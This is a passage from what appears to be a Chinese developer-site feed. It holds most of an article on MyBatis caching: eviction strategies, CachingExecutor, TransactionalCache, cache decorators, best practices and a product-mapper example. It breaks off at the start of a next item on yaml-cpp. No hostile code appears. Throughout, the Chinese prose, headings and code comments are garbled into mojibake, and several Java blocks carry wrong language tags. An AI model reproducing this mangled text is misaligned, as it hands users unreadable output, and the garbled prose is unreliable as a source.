    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"selectById"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"User"</span>&gt;</span>
        SELECT * FROM t_user WHERE id = #{id}
    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>
</code></pre>
<p>é…ç½®å‚æ•°è¯¦è§£ï¼š</p>









































<table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th><th>å¯é€‰å€¼</th><th>é»˜è®¤å€¼</th></tr></thead><tbody><tr><td><strong>eviction</strong></td><td>æ·˜æ±°ç­–ç•¥</td><td>LRU/FIFO/SOFT/WEAK</td><td>LRU</td></tr><tr><td><strong>flushInterval</strong></td><td>åˆ·æ–°é—´éš”(æ¯«ç§’)</td><td>ä»»æ„æ­£æ•´æ•°</td><td>ä¸åˆ·æ–°</td></tr><tr><td><strong>size</strong></td><td>ç¼“å­˜å®¹é‡</td><td>ä»»æ„æ­£æ•´æ•°</td><td>1024</td></tr><tr><td><strong>readOnly</strong></td><td>æ˜¯å¦åªè¯»</td><td>true/false</td><td>false</td></tr><tr><td><strong>blocking</strong></td><td>æ˜¯å¦é˜»å¡</td><td>true/false</td><td>false</td></tr></tbody></table>
<h2 data-id="heading-15">å››å¤§æ·˜æ±°ç­–ç•¥</h2>
<ol>
<li>LRUï¼ˆæ¨èï¼‰</li>
<li>FIFO</li>
<li>SOFT</li>
<li>WEAK</li>
</ol>

<pre><code class="hljs language-ini" lang="ini">&lt;cache <span class="hljs-attr">eviction</span>=<span class="hljs-string">"LRU"</span>/&gt;
</code></pre>
<p>æœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼Œæ·˜æ±°æœ€ä¹…æœªè®¿é—®çš„æ•°æ®</p>
<pre><code class="hljs language-ini" lang="ini">&lt;cache <span class="hljs-attr">eviction</span>=<span class="hljs-string">"FIFO"</span>/&gt;
</code></pre>
<p>å…ˆè¿›å…ˆå‡ºï¼ŒæŒ‰å†™å…¥é¡ºåºæ·˜æ±°</p>
<pre><code class="hljs language-ini" lang="ini">&lt;cache <span class="hljs-attr">eviction</span>=<span class="hljs-string">"SOFT"</span>/&gt;
</code></pre>
<p>è½¯å¼•ç”¨ï¼Œå†…å­˜ä¸è¶³æ—¶æ‰å›æ”¶</p>
<pre><code class="hljs language-ini" lang="ini">&lt;cache <span class="hljs-attr">eviction</span>=<span class="hljs-string">"WEAK"</span>/&gt;
</code></pre>
<p>å¼±å¼•ç”¨ï¼ŒGCæ—¶å³å¯å›æ”¶</p>
<h2 data-id="heading-16">CachingExecutorï¼šäºŒçº§ç¼“å­˜çš„æŒ‡æŒ¥å®˜</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CachingExecutor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Executor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">TransactionalCacheManager</span> <span class="hljs-variable">tcm</span> <span class="hljs-operator">=</span> 
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionalCacheManager</span>();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> &lt;E&gt; List&lt;E&gt; <span class="hljs-title function_">query</span><span class="hljs-params">(...)</span> {
        <span class="hljs-type">Cache</span> <span class="hljs-variable">cache</span> <span class="hljs-operator">=</span> ms.getCache();

        <span class="hljs-keyword">if</span> (cache != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">//å°è¯•ä»äºŒçº§ç¼“å­˜è·å–</span>
            List&lt;E&gt; list = (List&lt;E&gt;) tcm.getObject(cache, key);
            <span class="hljs-keyword">if</span> (list != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> list; <span class="hljs-comment">//å‘½ä¸­ï¼</span>
            }
        }

        <span class="hljs-comment">//å§”æ‰˜ç»™BaseExecutoræŸ¥è¯¢ï¼ˆä¼šèµ°ä¸€çº§ç¼“å­˜ï¼‰</span>
        List&lt;E&gt; list = delegate.query(...);

        <span class="hljs-comment">//ç»“æœå†™å…¥äºŒçº§ç¼“å­˜</span>
        <span class="hljs-keyword">if</span> (cache != <span class="hljs-literal">null</span>) {
            tcm.putObject(cache, key, list);
        }

        <span class="hljs-keyword">return</span> list;
    }
}
</code></pre>
<h2 data-id="heading-17">TransactionalCacheï¼šäº‹åŠ¡ç¼“å­˜ç®¡å®¶</h2>
<p>äº‹åŠ¡ç¼“å­˜ç¡®ä¿åªæœ‰æäº¤åçš„æ•°æ®æ‰ä¼šè¿›å…¥äºŒçº§ç¼“å­˜ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionalCache</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt; entriesToAddOnCommit;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">putObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key, <span class="hljs-built_in">Object</span> value</span>) {
        <span class="hljs-comment">//æš‚å­˜ï¼Œä¸ç«‹å³å†™å…¥</span>
        entriesToAddOnCommit.<span class="hljs-title function_">put</span>(key, value);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">commit</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// æäº¤æ—¶æ‰çœŸæ­£å†™å…¥ç¼“å­˜</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Map</span>.<span class="hljs-property">Entry</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt; entry : 
             entriesToAddOnCommit.<span class="hljs-title function_">entrySet</span>()) {
            delegate.<span class="hljs-title function_">putObject</span>(entry.<span class="hljs-title function_">getKey</span>(), entry.<span class="hljs-title function_">getValue</span>());
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">rollback</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// å›æ»šæ—¶ä¸¢å¼ƒæš‚å­˜æ•°æ®</span>
        entriesToAddOnCommit.<span class="hljs-title function_">clear</span>();
    }
}
</code></pre>
<h2 data-id="heading-18">è·¨ä¼šè¯å…±äº«ç¤ºä¾‹</h2>
<pre><code class="hljs language-ini" lang="ini">//ä¼šè¯1
SqlSession <span class="hljs-attr">session1</span> = sqlSessionFactory.openSession()<span class="hljs-comment">;</span>
UserMapper <span class="hljs-attr">mapper1</span> = session1.getMapper(UserMapper.class)<span class="hljs-comment">;</span>
User <span class="hljs-attr">user1</span> = mapper1.selectById(<span class="hljs-number">1</span>L)<span class="hljs-comment">;</span>
System.out.println("ä¼šè¯1æŸ¥è¯¢: " + user1)<span class="hljs-comment">;</span>
session1.commit()<span class="hljs-comment">; //æäº¤ï¼Œå†™å…¥äºŒçº§ç¼“å­˜</span>
session1.close()<span class="hljs-comment">;</span>
//ä¼šè¯2
SqlSession <span class="hljs-attr">session2</span> = sqlSessionFactory.openSession()<span class="hljs-comment">;</span>
UserMapper <span class="hljs-attr">mapper2</span> = session2.getMapper(UserMapper.class)<span class="hljs-comment">;</span>
User <span class="hljs-attr">user2</span> = mapper2.selectById(<span class="hljs-number">1</span>L)<span class="hljs-comment">; //ä»äºŒçº§ç¼“å­˜è·å–</span>
System.out.println("ä¼šè¯2æŸ¥è¯¢: " + user2)<span class="hljs-comment">;</span>
//å¯¹æ¯”ç»“æœ
System.out.println("åŒä¸€å¯¹è±¡? " + (<span class="hljs-attr">user1</span> == user2))<span class="hljs-comment">; //false</span>
System.out.println("å€¼ç›¸ç­‰? " + user1.equals(user2))<span class="hljs-comment">; //true</span>
session2.close()<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-19">äº”ã€ç¼“å­˜å‘½ä¸­æµç¨‹</h2>
<p>å…¨æ™¯ç†è§£ç¼“å­˜çš„å®Œæ•´æŸ¥è¯¢æµç¨‹ï¼Œæ˜¯ä¼˜åŒ–æ€§èƒ½çš„å…³é”®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/774912ed56e640a78218d99c4354807c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947081&amp;x-signature=7G3XYVlAQSSz7WVoRc2RuCM64NQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-20">å®Œæ•´æŸ¥è¯¢é“¾è·¯</h2>
<pre><code class="hljs language-markdown" lang="markdown">æŸ¥è¯¢è¯·æ±‚
<span class="hljs-code">    â†“
æ£€æŸ¥äºŒçº§ç¼“å­˜
    â”œâ”€ å‘½ä¸­ â†’ ç›´æ¥è¿”å›
    â””â”€ æœªå‘½ä¸­
         â†“
    æ£€æŸ¥ä¸€çº§ç¼“å­˜
         â”œâ”€ å‘½ä¸­ â†’ ç›´æ¥è¿”å›
         â””â”€ æœªå‘½ä¸­
              â†“
         æŸ¥è¯¢æ•°æ®åº“
              â†“
         å†™å…¥ä¸€çº§ç¼“å­˜
              â†“
         å†™å…¥äºŒçº§ç¼“å­˜ï¼ˆæäº¤åï¼‰
              â†“
         è¿”å›ç»“æœ
</span></code></pre>
<h2 data-id="heading-21">æºç å®ç°</h2>
<pre><code class="hljs language-scss" lang="scss">public &lt;E&gt; List&lt;E&gt; <span class="hljs-built_in">query</span>(MappedStatement ms, Object parameter, ...) {
    BoundSql boundSql = ms<span class="hljs-selector-class">.getBoundSql</span>(parameter);
    CacheKey key = <span class="hljs-built_in">createCacheKey</span>(ms, parameter, rowBounds, boundSql);

    <span class="hljs-comment">// æ­¥éª¤1ï¼šæŸ¥äºŒçº§ç¼“å­˜</span>
    Cache cache = ms<span class="hljs-selector-class">.getCache</span>();
    if (cache != null &amp;&amp; ms.isUseCache()) {
        List&lt;E&gt; list = (List&lt;E&gt;) tcm<span class="hljs-selector-class">.getObject</span>(cache, key);
        if (list != null) {
            return list; <span class="hljs-comment">// äºŒçº§ç¼“å­˜å‘½ä¸­</span>
        }
    }

    <span class="hljs-comment">// æ­¥éª¤2ï¼šæŸ¥ä¸€çº§ç¼“å­˜</span>
    List&lt;E&gt; list = (List&lt;E&gt;) localCache<span class="hljs-selector-class">.getObject</span>(key);
    if (list != null) {
        return list; <span class="hljs-comment">// ä¸€çº§ç¼“å­˜å‘½ä¸­</span>
    }

    <span class="hljs-comment">//æ­¥éª¤3ï¼šæŸ¥æ•°æ®åº“</span>
    list = <span class="hljs-built_in">queryFromDatabase</span>(ms, parameter, ...);

    <span class="hljs-comment">//æ­¥éª¤4ï¼šå†™å…¥ç¼“å­˜</span>
    localCache<span class="hljs-selector-class">.putObject</span>(key, list);
    if (cache != null) {
        tcm<span class="hljs-selector-class">.putObject</span>(cache, key, list);
    }

    return list;
}
</code></pre>
<h2 data-id="heading-22">å…­ã€è£…é¥°å™¨æ¨¡å¼çš„è¿ç”¨</h2>
<p>MyBatisç¼“å­˜çš„è£…é¥°å™¨è®¾è®¡å ªç§°ç»å…¸ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•"ç»™ç¼“å­˜ç©¿è¡£æœ"ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4444a998bbf45dbb1e37b8596b50b1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947081&amp;x-signature=Gx%2BfsEnxv%2FuSGg3OQD7B4npkcB4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-23">LruCacheï¼šæ™ºèƒ½æ·˜æ±°</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LruCache</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Cache</span> delegate;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt; keyMap; <span class="hljs-comment">// LinkedHashMapå®ç°LRU</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Object</span> eldestKey;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key</span>) {
        keyMap.<span class="hljs-title function_">get</span>(key); <span class="hljs-comment">//è®¿é—®å³åˆ·æ–°é¡ºåº</span>
        <span class="hljs-keyword">return</span> delegate.<span class="hljs-title function_">getObject</span>(key);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">putObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key, <span class="hljs-built_in">Object</span> value</span>) {
        delegate.<span class="hljs-title function_">putObject</span>(key, value);
        <span class="hljs-title function_">cycleKeyList</span>(key); <span class="hljs-comment">//æ·˜æ±°æœ€ä¹…æœªç”¨çš„</span>
    }
}
</code></pre>
<h2 data-id="heading-24">ScheduledCacheï¼šå®šæ—¶æ¸…ç†</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScheduledCache</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-keyword">private</span> long <span class="hljs-built_in">clearInterval</span> = <span class="hljs-number">3600000</span>; <span class="hljs-comment">// 1å°æ—¶</span>
    <span class="hljs-keyword">private</span> long lastClear;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">System</span>.<span class="hljs-title function_">currentTimeMillis</span>() - lastClear &gt; <span class="hljs-built_in">clearInterval</span>) {
            <span class="hljs-title function_">clear</span>(); <span class="hljs-comment">//æ—¶é—´åˆ°ï¼Œæ¸…ç©ºç¼“å­˜</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        <span class="hljs-keyword">return</span> delegate.<span class="hljs-title function_">getObject</span>(key);
    }
}
</code></pre>
<h2 data-id="heading-25">SerializedCacheï¼šæ·±æ‹·è´ä¿æŠ¤</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializedCache</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">putObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key, <span class="hljs-built_in">Object</span> value</span>) {
        <span class="hljs-comment">// åºåˆ—åŒ–å­˜å‚¨</span>
        delegate.<span class="hljs-title function_">putObject</span>(key, <span class="hljs-title function_">serialize</span>((<span class="hljs-title class_">Serializable</span>) value));
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key</span>) {
        <span class="hljs-comment">// ååºåˆ—åŒ–è¿”å›ï¼Œæ¯æ¬¡éƒ½æ˜¯æ–°å¯¹è±¡</span>
        <span class="hljs-title class_">Object</span> <span class="hljs-built_in">object</span> = delegate.<span class="hljs-title function_">getObject</span>(key);
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">object</span> == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : <span class="hljs-title function_">deserialize</span>((byte[]) <span class="hljs-built_in">object</span>);
    }
}
</code></pre>
<h2 data-id="heading-26">SynchronizedCacheï¼šçº¿ç¨‹å®‰å…¨å«å£«</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SynchronizedCache</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> synchronized <span class="hljs-built_in">void</span> <span class="hljs-title function_">putObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key, <span class="hljs-built_in">Object</span> value</span>) {
        delegate.<span class="hljs-title function_">putObject</span>(key, value);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> synchronized <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key</span>) {
        <span class="hljs-keyword">return</span> delegate.<span class="hljs-title function_">getObject</span>(key);
    }
}
</code></pre>
<h2 data-id="heading-27">è£…é¥°å™¨é“¾çš„æ„å»º</h2>
<pre><code class="hljs language-scss" lang="scss">private Cache <span class="hljs-built_in">setStandardDecorators</span>(Cache cache) {
    <span class="hljs-comment">//æŒ‰é¡ºåºç©¿è¡£æœ</span>
    if (blocking) {
        cache = new <span class="hljs-built_in">BlockingCache</span>(cache);
    }
    if (readWrite) {
        cache = new <span class="hljs-built_in">SerializedCache</span>(cache);
    }
    if (scheduled) {
        cache = new <span class="hljs-built_in">ScheduledCache</span>(cache);
    }
    if (logging) {
        cache = new <span class="hljs-built_in">LoggingCache</span>(cache);
    }
    if (sync) {
        cache = new <span class="hljs-built_in">SynchronizedCache</span>(cache);
    }
    <span class="hljs-comment">//LRUé€šå¸¸æ˜¯æœ€å¤–å±‚</span>
    cache = new <span class="hljs-built_in">LruCache</span>(cache);

    return cache;
}
</code></pre>
<h2 data-id="heading-28">ä¸ƒã€æœ€ä½³å®è·µ</h2>
<h2 data-id="heading-29">æ¨èåšæ³•</h2>
<pre><code class="hljs language-ini" lang="ini">1.ä¸€çº§ç¼“å­˜- ä¿æŒé»˜è®¤å¼€å¯ï¼Œé€‚åˆå•ä¼šè¯é‡å¤æŸ¥è¯¢
2.äºŒçº§ç¼“å­˜- ä»…åœ¨è¯»å¤šå†™å°‘çš„åœºæ™¯å¼€å¯
3.LRUç­–ç•¥- å¤§å¤šæ•°åœºæ™¯çš„æœ€ä½³é€‰æ‹©
4.åˆç†è®¾ç½®å®¹é‡- æ ¹æ®ä¸šåŠ¡é‡è¯„ä¼°ï¼Œé¿å…å†…å­˜æº¢å‡º
5.åªè¯»ç¼“å­˜- ä¸å¯å˜å¯¹è±¡ä½¿ç”¨ 
<span class="hljs-attr">readOnly</span>=<span class="hljs-string">"true"</span>
</code></pre>
<h2 data-id="heading-30">é¿å…åšæ³•</h2>
<pre><code class="hljs">1.åœ¨é¢‘ç¹æ›´æ–°çš„è¡¨ä¸Šå¼€å¯äºŒçº§ç¼“å­˜
2.ç¼“å­˜å¤§å¯¹è±¡æˆ–åŒ…å«æ•æ„Ÿä¿¡æ¯çš„å¯¹è±¡
3.å¿½ç•¥ç¼“å­˜å¸¦æ¥çš„æ•°æ®ä¸€è‡´æ€§é—®é¢˜
4.ä¸ç›‘æ§ç¼“å­˜å‘½ä¸­ç‡å°±ç›²ç›®ä½¿ç”¨
</code></pre>
<h2 data-id="heading-31">æ€§èƒ½ä¼˜åŒ–æŠ€å·§</h2>
<ol>
<li>çƒ­ç‚¹æ•°æ®ä¼˜å…ˆ</li>
<li>åˆç†è®¾ç½®TTL</li>
<li>åªè¯»ç¼“å­˜åŠ é€Ÿ</li>
<li>ç›‘æ§å‘½ä¸­ç‡</li>
</ol>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- æ ¸å¿ƒä¸šåŠ¡è¡¨å•ç‹¬é…ç½® --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"2048"</span> <span class="hljs-attr">eviction</span>=<span class="hljs-string">"LRU"</span>/&gt;</span>
</code></pre>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- æ ¹æ®æ•°æ®æ›´æ–°é¢‘ç‡è®¾ç½® --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">flushInterval</span>=<span class="hljs-string">"300000"</span>/&gt;</span> <span class="hljs-comment">&lt;!-- 5åˆ†é’Ÿ --&gt;</span>
</code></pre>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- ä¸å¯å˜æ•°æ®ä½¿ç”¨åªè¯»ç¼“å­˜ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">readOnly</span>=<span class="hljs-string">"true"</span>/&gt;</span>
</code></pre>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- å¼€å¯æ—¥å¿—è®°å½• --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"logging"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"true"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">cache</span>&gt;</span>
</code></pre>
<h2 data-id="heading-32">å¸¸è§é—®é¢˜é€ŸæŸ¥</h2>
<p>é—®é¢˜1ï¼šäºŒçº§ç¼“å­˜ä¸ç”Ÿæ•ˆ</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- è§£å†³æ–¹æ¡ˆ --&gt;</span>
<span class="hljs-comment">&lt;!-- 1. æ£€æŸ¥å…¨å±€é…ç½® --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">settings</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"cacheEnabled"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"true"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 2. æ£€æŸ¥Mapperé…ç½® --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span>/&gt;</span>

<span class="hljs-comment">&lt;!-- 3. ç¡®ä¿å®ä½“ç±»å®ç°Serializable --&gt;</span>
public class User implements Serializable {
    private static final long serialVersionUID = 1L;

}
</code></pre>
<p>é—®é¢˜2ï¼šæ•°æ®ä¸ä¸€è‡´</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- è§£å†³æ–¹æ¡ˆï¼šåŠæ—¶åˆ·æ–°ç¼“å­˜ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"updateUser"</span> <span class="hljs-attr">flushCache</span>=<span class="hljs-string">"true"</span>&gt;</span>
    UPDATE t_user SET name = #{name} WHERE id = #{id}
<span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>

<span class="hljs-comment">&lt;!-- æˆ–è®¾ç½®è‡ªåŠ¨åˆ·æ–° --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">flushInterval</span>=<span class="hljs-string">"60000"</span>/&gt;</span>
</code></pre>
<p>é—®é¢˜3ï¼šå†…å­˜æº¢å‡º</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- è§£å†³æ–¹æ¡ˆ1ï¼šé™åˆ¶å®¹é‡ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"512"</span>/&gt;</span>

<span class="hljs-comment">&lt;!-- è§£å†³æ–¹æ¡ˆ2ï¼šä½¿ç”¨è½¯å¼•ç”¨ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">eviction</span>=<span class="hljs-string">"SOFT"</span>/&gt;</span>

<span class="hljs-comment">&lt;!-- è§£å†³æ–¹æ¡ˆ3ï¼šå®šæ—¶æ¸…ç† --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">flushInterval</span>=<span class="hljs-string">"3600000"</span>/&gt;</span>
</code></pre>
<h2 data-id="heading-33">å®æˆ˜æ¡ˆä¾‹</h2>
<p>åœºæ™¯ï¼šç”µå•†ç³»ç»Ÿå•†å“æŸ¥è¯¢ä¼˜åŒ–</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">"com.shop.mapper.ProductMapper"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 
        å•†å“ä¿¡æ¯å˜åŒ–ä¸é¢‘ç¹ï¼Œé€‚åˆäºŒçº§ç¼“å­˜
        ä½¿ç”¨LRUæ·˜æ±°ç­–ç•¥
        è®¾ç½®1å°æ—¶è‡ªåŠ¨åˆ·æ–°
        å®¹é‡2048ï¼Œè¦†ç›–çƒ­é—¨å•†å“
    --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">cache</span> <span class="hljs-attr">eviction</span>=<span class="hljs-string">"LRU"</span>
           <span class="hljs-attr">flushInterval</span>=<span class="hljs-string">"3600000"</span>
           <span class="hljs-attr">size</span>=<span class="hljs-string">"2048"</span>
           <span class="hljs-attr">readOnly</span>=<span class="hljs-string">"false"</span>/&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"selectById"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"Product"</span>&gt;</span>
        SELECT * FROM t_product WHERE id = #{id}
    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>

    <span class="hljs-comment">&lt;!--æ›´æ–°æ“ä½œå¼ºåˆ¶åˆ·æ–°ç¼“å­˜ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"updateProduct"</span> <span class="hljs-attr">flushCache</span>=<span class="hljs-string">"true"</span>&gt;</span>
        UPDATE t_product SET price = #{price} WHERE id = #{id}
    <span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>
</code></pre>
<h2 data-id="heading-34">å…«ã€æ€»ç»“</h2>
<pre><code class="hljs">ä¸€çº§ç¼“å­˜
âœ… SqlSessionçº§åˆ«
âœ… é»˜è®¤å¼€å¯
âœ… å¢åˆ æ”¹è‡ªåŠ¨æ¸…ç©º
âœ… é€‚åˆå•ä¼šè¯é‡å¤æŸ¥è¯¢
äºŒçº§ç¼“å­˜
âœ… Mapperçº§åˆ«
âœ… éœ€æ‰‹åŠ¨é…ç½®
âœ… è·¨SqlSessionå…±äº«
âœ… é€‚åˆè¯»å¤šå†™å°‘åœºæ™¯
è£…é¥°å™¨æ¨¡å¼
âœ… çµæ´»ç»„åˆåŠŸèƒ½
âœ… æ”¯æŒå¤šç§æ·˜æ±°ç­–ç•¥
âœ… å¯æ‰©å±•è‡ªå®šä¹‰å®ç°
CacheKeyæœºåˆ¶
âœ… å¤šå…ƒç´ ç»„æˆ
âœ… ç¡®ä¿å”¯ä¸€æ€§
âœ… ç²¾ç¡®å‘½ä¸­åˆ¤æ–­
</code></pre>
<p>ç¼“å­˜æ˜¯æå‡æ€§èƒ½çš„åˆ©å™¨ï¼Œä½†ä¹Ÿæ˜¯ä¸€æŠŠåŒåˆƒå‰‘ã€‚ç†è§£MyBatisç¼“å­˜çš„å·¥ä½œåŸç†ï¼Œæ‰èƒ½åœ¨å®æˆ˜ä¸­æ¸¸åˆƒæœ‰ä½™ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‹’ç»ç¡¬ç¼–ç ï¼C++ é…ç½®æ–‡ä»¶ç®¡ç†ç¥å™¨ yaml-cpp å®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7589962224795942950</link>    <guid>https://juejin.cn/post/7589962224795942950</guid>    <pubDate>2026-01-02T08:37:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589962224795942950" data-draft-id="7590011643296661542" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‹’ç»ç¡¬ç¼–ç ï¼C++ é…ç½®æ–‡ä»¶ç®¡ç†ç¥å™¨ yaml-cpp å®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="C++"/> <meta itemprop="datePublished" content="2026-01-02T08:37:09.000Z"/> <meta 